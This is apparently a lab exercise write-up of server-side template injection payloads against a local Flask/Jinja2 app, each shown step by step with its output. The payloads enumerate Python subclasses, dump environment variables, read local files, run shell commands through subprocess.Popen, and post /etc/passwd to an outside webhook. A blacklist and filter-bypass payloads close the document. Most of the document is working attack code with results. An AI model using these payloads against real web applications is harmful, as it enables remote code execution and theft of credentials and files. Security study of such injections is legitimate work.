<h2>Give unique SSTI payloads for the given cases</h2>

<h3>1. Return the index of urllib in subclasses():</h3>

<b>Payload:</b> `{{ ().__class__.__mro__[1].__subclasses__() }}`

<b>Steps:</b>

1. `{{ ().__class__ }}`:

Output:
```python
<class 'tuple'>
```

2. `{{ ().__class__.__mro__ }}`

Output:
```python
(<class 'tuple'>, <class 'object'>)
```

3. `{{ ().__class__.__mro__[1] }}`

Output:
```python
<class 'object'>
```

4. `{{ ().__class__.__mro__[1].__subclasses__ }}`

Output:
```python
<built-in method __subclasses__ of type object at 0x00007FF8E82C8710>
```

5. `{{ ().__class__.__mro__[1].__subclasses__() }}`

Output (for first 10 classes):
```python
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>]
```

6. I tried using methods like __getitem__, getattr, attr, simple .index(), but I couldn't get the website itself to print the index of urllib. Couldn't find any website or writeup that did this either. Hence I just iterated through the list and found urllib mentioned 11 times at indices [269, 270, 271, 337, 338, 339, 340, 341, 342, 343, 344].

<h3>2. Get name of current python flask script:</h3>

<b>Payload:</b> `{{ request.__class__.__init__.__globals__.__builtins__.__import__('__main__') }}`

<b>Steps:</b>

1. `{{ request }}`

Output:
```python
<Request 'http://127.0.0.1:5000/?c={{%20request%20}}' [GET]>
```

2. `{{ request.__class__ }}`

Output:
```python
<class 'flask.wrappers.Request'>
```

3. `{{ request.__class__.__init__ }}`

Output:
```python
<function Request.__init__ at 0x000001CE646993A0>
```

4. `{{ request.__class__.__init__.__globals__ }}`

Output:
```python
{'__name__': 'werkzeug.wrappers.request', '__doc__': None, '__package__': 'werkzeug.wrappers', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x000001CE6467EF00>, '__spec__': ModuleSpec(name='werkzeug.wrappers.request'}...

Shortened Output
```

5. `{{ request.__class__.__init__.__globals__.__builtins__ }}`

Output:
```python
{'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed."}...

Shortened Output
```

6. `{{ request.__class__.__init__.__globals__.__builtins__.__import__('__main__') }}`

Output:
```python
<module '__main__' from 'c:\\Users\\misha\\Desktop\\Important Stuff\\Python Programs\\Test.py'>
```

<h3>3. Get all the current envvars:</h3>

<b>Payload:</b> `{{ config.from_envvar.__globals__['os'].environ }}`

<b>Steps:</b>

1. `{{ config }}`

Output:
```python
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```

2. `{{ config.from_envvar }}`

Output:
```python
<bound method Config.from_envvar of <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>>
```

3. `{{ config.from_envvar.__globals__ }}`

Output:
```python
{'__name__': 'flask.config', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x00000239742B8A70>, '__spec__': ModuleSpec(name='flask.config', loader=<_frozen_importlib_external.SourceFileLoader object at 0x00000239742B8A70>, origin='C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\flask\\config.py'), '__file__': 'C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\flask\\config.py', '__cached__': 'C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\flask\\__pycache__\\config.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed."}}...

Shortened output
```

4. `{{ config.from_envvar.__globals__['os'] }}`

Output:
```python
<module 'os' (frozen)>
```

5. `{{ config.from_envvar.__globals__['os'].environ }}`

Output:
```python
environ({'ALLUSERSPROFILE': 'C:\\ProgramData', 'APPDATA': 'C:\\Users\\misha\\AppData\\Roaming', 'CHOCOLATEYINSTALL': 'C:\\ProgramData\\chocolatey', 'CHOCOLATEYLASTPATHUPDATE': '133503828970067848', 'CHROME_CRASHPAD_PIPE_NAME': '\\\\.\\pipe\\crashpad_26104_RHOXYOBDHTJYDYRT', 'COMMONPROGRAMFILES': 'C:\\Program Files\\Common Files', 'COMMONPROGRAMFILES(X86)': 'C:\\Program Files (x86)\\Common Files', 'COMMONPROGRAMW6432': 'C:\\Program Files\\Common Files', 'COMPUTERNAME': 'LAPTOP-H114S0UB', 'COMSPEC': 'C:\\Windows\\system32\\cmd.exe', 'DRIVERDATA': 'C:\\Windows\\System32\\Drivers\\DriverData', 'EFC_2580': '1',})...

Shortened Output
```

<h3>4. Read a local file:</h3>

<b>Payload:</b> `{{ request.__class__._load_form_data.__globals__.__builtins__.open("/Setup.log").read() }}`

<b>Steps:</b>

1. `{{ request }}`

Output:
```python
<Request 'http://127.0.0.1:5000/?c={{%20request%20}}' [GET]>
```

2. `{{ request.__class__ }}`

Output:
```python
<class 'flask.wrappers.Request'>
```

3. `{{ request.__class__._load_form_data }}`

Output:
```python
<function Request._load_form_data at 0x000002397444A200>
```

4. `{{ request.__class__._load_form_data.__globals__ }}`

Output:
```python
{'__name__': 'flask.wrappers', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x000002397442EDE0>, '__spec__': ModuleSpec(name='flask.wrappers', loader=<_frozen_importlib_external.SourceFileLoader object at 0x000002397442EDE0>, origin='C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\flask\\wrappers.py'), '__file__': 'C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\flask\\wrappers.py', '__cached__': 'C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\flask\\__pycache__\\wrappers.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed."}}...

Shortened Output
```

5. `{{ request.__class__._load_form_data.__globals__.__builtins__ }}`

Output:
```python
{'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed."}...

Shortened Output
```

6. `{{ request.__class__._load_form_data.__globals__.__builtins__.open("/Setup.log").read() }}`

Output:
```python
»¿2023-12-15 14:24:11.677 Log opened. (Time zone: UTC+05:30) 2023-12-15 14:24:11.677 Setup version: Inno Setup version 5.5.9 (u) 2023-12-15 14:24:11.677 Original Setup EXE: C:\PROGRA~3\Lenovo\Vantage\ADDIND~1\LENOVO~1\session\REPOSI~1\NERVEC~2\nervecenterdriverpatchfb4014.exe 2023-12-15 14:24:11.677 Setup command line:...

Shortened Output
```

<h3>5. Run a command:</h3>

<b>Payload:</b> `{{ 1.__class__.__base__.__subclasses__()[535]('whoami', shell=True, stdout=-1).communicate() }}`

<b>Steps:</b>

I tried converting the command to use getattr, but whatever I did, I kept getting internal server error. For example, to convert `{{ 1.__class__ }}` to getattr form, I did `{{ getattr(1, ['__class__']) }}`, which I think is correct, but it won't work.

1. `{{ 1.__class__ }}`

Output:
```python
<class 'int'>
```

2. `{{ 1.__class__.__base__ }}`

Output:
```python
<class 'object'>
```

3. `{{ 1.__class__.__base__.__subclasses__()[535] }}`

Output:
```python
<class 'subprocess.Popen'>
```

4. `{{ 1.__class__.__base__.__subclasses__()[535]('whoami', shell=True, stdout=-1).communicate() }}`

Output:
```python
(b'laptop-h114s0ub\\misha\r\n', None)
```

<h3>6. Send the contents of /etc/pass to a webhook:</h3>

<b>Payload:</b> `{{ request['__class__']['__init__']['__globals__']['__builtins__']['__import__']('requests')['post']['__call__']('https://mishajain123.requestcatcher.com', data={'file': request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()}) }}`

<b>Steps:</b>

1. `{{ request }}

Output:
```python
<Request 'http://127.0.0.1:5000/?c={{%20request%20}}' [GET]>
```

2. `{{ request['__class__'] }}`

Output:
```python
<class 'flask.wrappers.Request'>
```

3. `{{ request['__class__']['__init__'] }}`

Output:
```python
<function Request.__init__ at 0x000001910FB593A0>
```

4. `{{ request['__class__']['__init__']['__globals__'] }}`

Output:
```python
{'__name__': 'werkzeug.wrappers.request', '__doc__': None, '__package__': 'werkzeug.wrappers', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x000001910FB42FC0>, '__spec__': ModuleSpec(name='werkzeug.wrappers.request', loader=<_frozen_importlib_external.SourceFileLoader object at 0x000001910FB42FC0>}...

Shortened Output
```

5. `{{ request['__class__']['__init__']['__globals__']['__builtins__'] }}`

Output:
```python
{'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed."}...

Shortened Output
```

6. `{{ request['__class__']['__init__']['__globals__']['__builtins__']['__import__'] }}`

Output:
```python
<built-in function __import__>
```

7. `{{ request['__class__']['__init__']['__globals__']['__builtins__']['__import__']('requests') }}`

Output:
```python
<module 'requests' from 'C:\\Users\\misha\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\site-packages\\requests\\__init__.py'>
```

8. `{{ request['__class__']['__init__']['__globals__']['__builtins__']['__import__']('requests')['post'] }}`

Output:
```python
<function post at 0x0000019110A1A3E0>
```

9. `{{ request['__class__']['__init__']['__globals__']['__builtins__']['__import__']('requests')['post']['__call__'] }}`

Output:
```python
<method-wrapper '__call__' of function object at 0x0000019110A1A3E0>
```

10. {{ request['__class__']['__init__']['__globals__']['__builtins__']['__import__']('requests')['post']['__call__']('https://mishajain123.requestcatcher.com', data={'file': request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()}) }}

Output:
```python
<Response [200]>
```

<p align = 'center'>

![](<Images/Send the contents of _etc_pass to a webhook.png>)

</p>

<h3>7. Create a reverse shell, save your work and run the command yes on the rev shell</h3>

<b>Payload:</b> Honestly, no clue.

<h3>The Dreaded Blacklist</h3>

```python
["import", "open", "module", "write", "load", "read", "eval", "exec", "system", "os", "_", "#", "\'", "\""]
```

<h3>1. Return the index of urllib in subclasses():</h3>

<b>Payload:</b> `{{ (dict.mro()[-1]|att(%27\x5f\x5fsubclasses\x5f\x5f%27))() }}`

<h3>2. Get name of current python flask script:</h3>

<b>Payload:</b> `{{ request.__class__.__init__.__globals__.__builtins__.__import__('__main__') }}`

{{ request|att("\x5f\x5fclass\x5f\x5f") }}